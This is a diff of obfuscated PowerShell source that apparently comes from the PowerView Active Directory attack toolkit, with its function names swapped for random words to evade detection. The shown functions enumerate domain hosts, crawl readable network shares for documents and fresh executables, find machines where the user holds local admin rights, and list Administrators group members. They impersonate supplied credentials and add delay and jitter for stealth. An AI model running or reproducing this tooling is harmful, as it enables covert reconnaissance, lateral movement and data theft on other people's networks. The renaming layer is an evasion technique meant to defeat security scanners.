         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [ValidateRange(1, 10000)]
         [Int]
         $Delay = 0,
         [ValidateRange(0.0, 1.0)]
         [Double]
-        $ohvTlzbv99 = .3,
+        $Jitter = .3,
         [Int]
         [ValidateRange(1, 100)]
-        $wCkPnMUb99 = 20
+        $Threads = 20
     )
     BEGIN {
-        $tgaaoeGR99 = @{
+        $ComputerSearcherArguments = @{
             'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
-        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
-        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
-        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
-        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
-        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
-        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
         if ($PSBoundParameters['ComputerName']) {
-            $EqAZlVKw99 = $VrEmrUHq99
+            $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose '[indignantly] Querying computers in the domain'
-            $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[heights] Querying computers in the domain'
+            $TargetComputers = sonorous @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose "[indignantly] TargetComputers length: $($EqAZlVKw99.Length)"
-        if ($EqAZlVKw99.Length -eq 0) {
-            throw '[indignantly] No hosts found to enumerate'
+        Write-Verbose "[heights] TargetComputers length: $($TargetComputers.Length)"
+        if ($TargetComputers.Length -eq 0) {
+            throw '[heights] No hosts found to enumerate'
         }
-        $kEgRxIzp99 = {
-            Param($VrEmrUHq99, $CuygeMzO99, $OxWrrBbt99, $DXnIJKyo99, $dnROoQma99, $KMUtBgIc99, $SbmYKKRw99, $BmRRNCwx99)
-            if ($BmRRNCwx99) {
-                $Null = admonished -TokenHandle $BmRRNCwx99 -Quiet
+        $HostEnumBlock = {
+            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)
+            if ($TokenHandle) {
+                $Null = locale -TokenHandle $TokenHandle -Quiet
             }
-            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
-                $BwflBmXy99 = @()
-                if ($BumNVGRu99.StartsWith('\\')) {
-                    $BwflBmXy99 += $BumNVGRu99
+            ForEach ($TargetComputer in $ComputerName) {
+                $SearchShares = @()
+                if ($TargetComputer.StartsWith('\\')) {
+                    $SearchShares += $TargetComputer
                 }
                 else {
-                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
+                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                     if ($Up) {
-                        $OPByCexH99 = well -ComputerName $BumNVGRu99
-                        ForEach ($Share in $OPByCexH99) {
-                            $cjvROwQJ99 = $Share.Name
-                            $Path = '\\'+$BumNVGRu99+'\'+$cjvROwQJ99
-                            if (($cjvROwQJ99) -and ($cjvROwQJ99.Trim() -ne '')) {
-                                if ($OxWrrBbt99 -NotContains $cjvROwQJ99) {
+                        $Shares = tackier -ComputerName $TargetComputer
+                        ForEach ($Share in $Shares) {
+                            $ShareName = $Share.Name
+                            $Path = '\\'+$TargetComputer+'\'+$ShareName
+                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
+                                if ($ExcludedShares -NotContains $ShareName) {
                                     try {
                                         $Null = [IO.Directory]::GetFiles($Path)
-                                        $BwflBmXy99 += $Path
+                                        $SearchShares += $Path
                                     }
                                     catch {
                                         Write-Verbose "[!] No access to $Path"
@@ -9160,218 +9160,218 @@ function indignantly {
                         }
                     }
                 }
-                ForEach ($Share in $BwflBmXy99) {
+                ForEach ($Share in $SearchShares) {
                     Write-Verbose "Searching share: $Share"
-                    $BOOBPBNd99 = @{
+                    $SearchArgs = @{
                         'Path' = $Share
-                        'Include' = $CuygeMzO99
+                        'Include' = $Include
                     }
-                    if ($DXnIJKyo99) {
-                        $BOOBPBNd99['OfficeDocs'] = $DXnIJKyo99
+                    if ($OfficeDocs) {
+                        $SearchArgs['OfficeDocs'] = $OfficeDocs
                     }
-                    if ($KMUtBgIc99) {
-                        $BOOBPBNd99['FreshEXEs'] = $KMUtBgIc99
+                    if ($FreshEXEs) {
+                        $SearchArgs['FreshEXEs'] = $FreshEXEs
                     }
-                    if ($uKMZoAej99) {
-                        $BOOBPBNd99['LastAccessTime'] = $uKMZoAej99
+                    if ($LastAccessTime) {
+                        $SearchArgs['LastAccessTime'] = $LastAccessTime
                     }
-                    if ($QRdxeHwL99) {
-                        $BOOBPBNd99['LastWriteTime'] = $QRdxeHwL99
+                    if ($LastWriteTime) {
+                        $SearchArgs['LastWriteTime'] = $LastWriteTime
                     }
-                    if ($rZqUJwQL99) {
-                        $BOOBPBNd99['CreationTime'] = $rZqUJwQL99
+                    if ($CreationTime) {
+                        $SearchArgs['CreationTime'] = $CreationTime
                     }
-                    if ($SbmYKKRw99) {
-                        $BOOBPBNd99['CheckWriteAccess'] = $SbmYKKRw99
+                    if ($CheckWriteAccess) {
+                        $SearchArgs['CheckWriteAccess'] = $CheckWriteAccess
                     }
-                    overlapping @SearchArgs
+                    motherless @SearchArgs
                 }
             }
-            if ($BmRRNCwx99) {
-                Nina
+            if ($TokenHandle) {
+                choke
             }
         }
-        $WUqPycDr99 = $Null
+        $LogonToken = $Null
         if ($PSBoundParameters['Credential']) {
             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-                $WUqPycDr99 = admonished -Credential $gxazvivN99
+                $LogonToken = locale -Credential $Credential
             }
             else {
-                $WUqPycDr99 = admonished -Credential $gxazvivN99 -Quiet
+                $LogonToken = locale -Credential $Credential -Quiet
             }
         }
     }
     PROCESS {
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-            Write-Verbose "[indignantly] Total number of hosts: $($EqAZlVKw99.count)"
-            Write-Verbose "[indignantly] Delay: $Delay, Jitter: $ohvTlzbv99"
-            $zLofmUyR99 = 0
-            $ZqgWUqYA99 = New-Object System.Random
-            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
-                $zLofmUyR99 = $zLofmUyR99 + 1
-                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
-                Write-Verbose "[indignantly] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
-                Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $CuygeMzO99, $OxWrrBbt99, $DXnIJKyo99, $dnROoQma99, $KMUtBgIc99, $SbmYKKRw99, $WUqPycDr99
+            Write-Verbose "[heights] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[heights] Delay: $Delay, Jitter: $Jitter"
+            $Counter = 0
+            $RandNo = New-Object System.Random
+            ForEach ($TargetComputer in $TargetComputers) {
+                $Counter = $Counter + 1
+                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose "[heights] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
             }
         }
         else {
-            Write-Verbose "[indignantly] Using threading with threads: $wCkPnMUb99"
-            $qczwSIpm99 = @{
-                'Include' = $CuygeMzO99
-                'ExcludedShares' = $OxWrrBbt99
-                'OfficeDocs' = $DXnIJKyo99
-                'ExcludeHidden' = $dnROoQma99
-                'FreshEXEs' = $KMUtBgIc99
-                'CheckWriteAccess' = $SbmYKKRw99
-                'TokenHandle' = $WUqPycDr99
+            Write-Verbose "[heights] Using threading with threads: $Threads"
+            $ScriptParams = @{
+                'Include' = $Include
+                'ExcludedShares' = $ExcludedShares
+                'OfficeDocs' = $OfficeDocs
+                'ExcludeHidden' = $ExcludeHidden
+                'FreshEXEs' = $FreshEXEs
+                'CheckWriteAccess' = $CheckWriteAccess
+                'TokenHandle' = $LogonToken
             }
-            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
+            wingnut -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function AstroTurf {
+function bleeds {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([String])]
     Param(
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DNSHostName')]
         [String[]]
-        $VrEmrUHq99,
+        $ComputerName,
         [ValidateNotNullOrEmpty()]
         [String]
-        $cdytPdAI99,
+        $ComputerDomain,
         [ValidateNotNullOrEmpty()]
         [String]
-        $glLCVedN99,
+        $ComputerLDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $WrwfvIMy99,
+        $ComputerSearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('OperatingSystem')]
         [String]
-        $fGipudMB99,
+        $ComputerOperatingSystem,
         [ValidateNotNullOrEmpty()]
         [Alias('ServicePack')]
         [String]
-        $JKXRZnBu99,
+        $ComputerServicePack,
         [ValidateNotNullOrEmpty()]
         [Alias('SiteName')]
         [String]
-        $GtxmnElz99,
+        $ComputerSiteName,
         [Switch]
-        $nvVkzIIC99,
+        $CheckShareAccess,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [ValidateRange(1, 10000)]
         [Int]
         $Delay = 0,
         [ValidateRange(0.0, 1.0)]
         [Double]
-        $ohvTlzbv99 = .3,
+        $Jitter = .3,
         [Int]
         [ValidateRange(1, 100)]
-        $wCkPnMUb99 = 20
+        $Threads = 20
     )
     BEGIN {
-        $tgaaoeGR99 = @{
+        $ComputerSearcherArguments = @{
             'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
-        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
-        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
-        if ($PSBoundParameters['Unconstrained']) { $tgaaoeGR99['Unconstrained'] = $DZNONYED99 }
-        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
-        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
-        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
-        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
         if ($PSBoundParameters['ComputerName']) {
-            $EqAZlVKw99 = $VrEmrUHq99
+            $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose '[AstroTurf] Querying computers in the domain'
-            $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[bleeds] Querying computers in the domain'
+            $TargetComputers = sonorous @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose "[AstroTurf] TargetComputers length: $($EqAZlVKw99.Length)"
-        if ($EqAZlVKw99.Length -eq 0) {
-            throw '[AstroTurf] No hosts found to enumerate'
+        Write-Verbose "[bleeds] TargetComputers length: $($TargetComputers.Length)"
+        if ($TargetComputers.Length -eq 0) {
+            throw '[bleeds] No hosts found to enumerate'
         }
-        $kEgRxIzp99 = {
-            Param($VrEmrUHq99, $BmRRNCwx99)
-            if ($BmRRNCwx99) {
-                $Null = admonished -TokenHandle $BmRRNCwx99 -Quiet
+        $HostEnumBlock = {
+            Param($ComputerName, $TokenHandle)
+            if ($TokenHandle) {
+                $Null = locale -TokenHandle $TokenHandle -Quiet
             }
-            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
-                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
+            ForEach ($TargetComputer in $ComputerName) {
+                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    $ZcslebsY99 = Abelson -ComputerName $BumNVGRu99
-                    if ($ZcslebsY99.IsAdmin) {
-                        $BumNVGRu99
+                    $Access = milkshake -ComputerName $TargetComputer
+                    if ($Access.IsAdmin) {
+                        $TargetComputer
                     }
                 }
             }
-            if ($BmRRNCwx99) {
-                Nina
+            if ($TokenHandle) {
+                choke
             }
         }
-        $WUqPycDr99 = $Null
+        $LogonToken = $Null
         if ($PSBoundParameters['Credential']) {
             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-                $WUqPycDr99 = admonished -Credential $gxazvivN99
+                $LogonToken = locale -Credential $Credential
             }
             else {
-                $WUqPycDr99 = admonished -Credential $gxazvivN99 -Quiet
+                $LogonToken = locale -Credential $Credential -Quiet
             }
         }
     }
     PROCESS {
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-            Write-Verbose "[AstroTurf] Total number of hosts: $($EqAZlVKw99.count)"
-            Write-Verbose "[AstroTurf] Delay: $Delay, Jitter: $ohvTlzbv99"
-            $zLofmUyR99 = 0
-            $ZqgWUqYA99 = New-Object System.Random
-            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
-                $zLofmUyR99 = $zLofmUyR99 + 1
-                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
-                Write-Verbose "[AstroTurf] Enumerating server $BumNVGRu99 ($zLofmUyR99 of $($EqAZlVKw99.count))"
-                Invoke-Command -ScriptBlock $kEgRxIzp99 -ArgumentList $BumNVGRu99, $WUqPycDr99
+            Write-Verbose "[bleeds] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[bleeds] Delay: $Delay, Jitter: $Jitter"
+            $Counter = 0
+            $RandNo = New-Object System.Random
+            ForEach ($TargetComputer in $TargetComputers) {
+                $Counter = $Counter + 1
+                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+                Write-Verbose "[bleeds] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
             }
         }
         else {
-            Write-Verbose "[AstroTurf] Using threading with threads: $wCkPnMUb99"
-            $qczwSIpm99 = @{
-                'TokenHandle' = $WUqPycDr99
+            Write-Verbose "[bleeds] Using threading with threads: $Threads"
+            $ScriptParams = @{
+                'TokenHandle' = $LogonToken
             }
-            glorious -ComputerName $EqAZlVKw99 -ScriptBlock $kEgRxIzp99 -ScriptParameters $qczwSIpm99 -Threads $wCkPnMUb99
+            wingnut -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 }
-function strutting {
+function polite {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.LocalGroupMember.API')]
     [OutputType('PowerView.LocalGroupMember.WinNT')]
@@ -9379,156 +9379,156 @@ function strutting {
         [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [Alias('DNSHostName')]
         [String[]]
-        $VrEmrUHq99,
+        $ComputerName,
         [ValidateNotNullOrEmpty()]
         [String]
-        $cdytPdAI99,
+        $ComputerDomain,
         [ValidateNotNullOrEmpty()]
         [String]
-        $glLCVedN99,
+        $ComputerLDAPFilter,
         [ValidateNotNullOrEmpty()]
         [String]
-        $WrwfvIMy99,
+        $ComputerSearchBase,
         [ValidateNotNullOrEmpty()]
         [Alias('OperatingSystem')]
         [String]
-        $fGipudMB99,
+        $ComputerOperatingSystem,
         [ValidateNotNullOrEmpty()]
         [Alias('ServicePack')]
         [String]
-        $JKXRZnBu99,
+        $ComputerServicePack,
         [ValidateNotNullOrEmpty()]
         [Alias('SiteName')]
         [String]
-        $GtxmnElz99,
+        $ComputerSiteName,
         [Parameter(ValueFromPipelineByPropertyName = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $SZjbzmKX99 = 'Administrators',
+        $GroupName = 'Administrators',
         [ValidateSet('API', 'WinNT')]
         [Alias('CollectionMethod')]
         [String]
-        $AlrHOHqQ99 = 'API',
+        $Method = 'API',
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $vaSWXjPs99 = 'Subtree',
+        $SearchScope = 'Subtree',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
+        $Credential = [Management.Automation.PSCredential]::Empty,
         [ValidateRange(1, 10000)]
         [Int]
         $Delay = 0,
         [ValidateRange(0.0, 1.0)]
         [Double]
-        $ohvTlzbv99 = .3,
+        $Jitter = .3,
         [Int]
         [ValidateRange(1, 100)]
-        $wCkPnMUb99 = 20
+        $Threads = 20
     )
     BEGIN {
-        $tgaaoeGR99 = @{
+        $ComputerSearcherArguments = @{
             'Properties' = 'dnshostname'
         }
-        if ($PSBoundParameters['ComputerDomain']) { $tgaaoeGR99['Domain'] = $cdytPdAI99 }
-        if ($PSBoundParameters['ComputerLDAPFilter']) { $tgaaoeGR99['LDAPFilter'] = $glLCVedN99 }
-        if ($PSBoundParameters['ComputerSearchBase']) { $tgaaoeGR99['SearchBase'] = $WrwfvIMy99 }
-        if ($PSBoundParameters['Unconstrained']) { $tgaaoeGR99['Unconstrained'] = $DZNONYED99 }
-        if ($PSBoundParameters['ComputerOperatingSystem']) { $tgaaoeGR99['OperatingSystem'] = $wSsSBiPZ99 }
-        if ($PSBoundParameters['ComputerServicePack']) { $tgaaoeGR99['ServicePack'] = $qoqQUCpy99 }
-        if ($PSBoundParameters['ComputerSiteName']) { $tgaaoeGR99['SiteName'] = $nqApdsmI99 }
-        if ($PSBoundParameters['Server']) { $tgaaoeGR99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['SearchScope']) { $tgaaoeGR99['SearchScope'] = $vaSWXjPs99 }
-        if ($PSBoundParameters['ResultPageSize']) { $tgaaoeGR99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $tgaaoeGR99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Tombstone']) { $tgaaoeGR99['Tombstone'] = $rPozaKft99 }
-        if ($PSBoundParameters['Credential']) { $tgaaoeGR99['Credential'] = $gxazvivN99 }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
         if ($PSBoundParameters['ComputerName']) {
-            $EqAZlVKw99 = $VrEmrUHq99
+            $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose '[strutting] Querying computers in the domain'
-            $EqAZlVKw99 = doubtlessly @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[polite] Querying computers in the domain'
+            $TargetComputers = sonorous @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose "[strutting] TargetComputers length: $($EqAZlVKw99.Length)"
-        if ($EqAZlVKw99.Length -eq 0) {
-            throw '[strutting] No hosts found to enumerate'
+        Write-Verbose "[polite] TargetComputers length: $($TargetComputers.Length)"
+        if ($TargetComputers.Length -eq 0) {
+            throw '[polite] No hosts found to enumerate'
         }
-        $kEgRxIzp99 = {
-            Param($VrEmrUHq99, $SZjbzmKX99, $AlrHOHqQ99, $BmRRNCwx99)
-            if ($SZjbzmKX99 -eq "Administrators") {
-                $YakjKSkd99 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
-                $SZjbzmKX99 = ($YakjKSkd99.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
+        $HostEnumBlock = {
+            Param($ComputerName, $GroupName, $Method, $TokenHandle)
+            if ($GroupName -eq "Administrators") {
+                $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
+                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
             }
-            if ($BmRRNCwx99) {
-                $Null = admonished -TokenHandle $BmRRNCwx99 -Quiet
+            if ($TokenHandle) {
+                $Null = locale -TokenHandle $TokenHandle -Quiet
             }
-            ForEach ($BumNVGRu99 in $VrEmrUHq99) {
-                $Up = Test-Connection -Count 1 -Quiet -ComputerName $BumNVGRu99
+            ForEach ($TargetComputer in $ComputerName) {
+                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    $OBvgdrJs99 = @{
-                        'ComputerName' = $BumNVGRu99
-                        'Method' = $AlrHOHqQ99
-                        'GroupName' = $SZjbzmKX99
+                    $NetLocalGroupMemberArguments = @{
+                        'ComputerName' = $TargetComputer
+                        'Method' = $Method
+                        'GroupName' = $GroupName
                     }
-                    stipends @NetLocalGroupMemberArguments
+                    epiglottides @NetLocalGroupMemberArguments
                 }
             }
-            if ($BmRRNCwx99) {
-                Nina
+            if ($TokenHandle) {
+                choke
             }
         }
-        $WUqPycDr99 = $Null
+        $LogonToken = $Null
         if ($PSBoundParameters['Credential']) {
             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-                $WUqPycDr99 = admonished -Credential $gxazvivN99
+                $LogonToken = locale -Credential $Credential
             }
             else {
-                $WUqPycDr99 = admonished -Credential $gxazvivN99 -Quiet
+                $LogonToken = locale -Credential $Credential -Quiet
             }
         }
     }
     PROCESS {
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-            Write-Verbose "[strutting] Total number of hosts: $($EqAZlVKw99.count)"
-            Write-Verbose "[strutting] Delay: $Delay, Jitter: $ohvTlzbv99"
-            $zLofmUyR99 = 0
-            $ZqgWUqYA99 = New-Object System.Random
-            ForEach ($BumNVGRu99 in $EqAZlVKw99) {
-                $zLofmUyR99 = $zLofmUyR99 + 1
-                Start-Sleep -Seconds $ZqgWUqYA99.Next((1-$ohvTlzbv99)*$Delay, (1+$ohvTlzbv99)*$Delay)
